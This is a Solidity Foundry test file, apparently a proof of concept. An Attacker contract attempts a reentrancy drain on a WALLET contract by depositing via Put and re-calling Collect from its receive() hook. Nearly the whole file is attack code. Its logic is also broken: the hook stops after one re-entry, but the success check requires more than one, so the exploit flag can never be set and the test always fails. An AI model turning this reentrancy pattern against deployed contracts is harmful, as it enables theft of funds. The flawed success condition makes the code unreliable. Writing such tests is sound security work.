
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {WALLET} from "../src/WALLET.sol";
import {Log} from "../src/Log.sol";

contract TestReentrancyWALLET is Test {
    WALLET public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new WALLET(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.1 ether && attackVal < type(uint128).max);

        uint256 victimInitialBalance = attackVal * 2;
        vm.deal(address(_contractUnderTest), victimInitialBalance);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        
        vm.warp(block.timestamp + 1000);
        
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;
    uint256 public initialBalance;

    constructor(address victimAddress) {
        _victim = WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        uint256 futureTime = block.timestamp + 500;
        _victim.Put{value: msg.value}(futureTime);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        initialBalance = address(_victim).balance;
        
        _victim.Collect(val);
        
        if (attackCallCount > 1 && address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
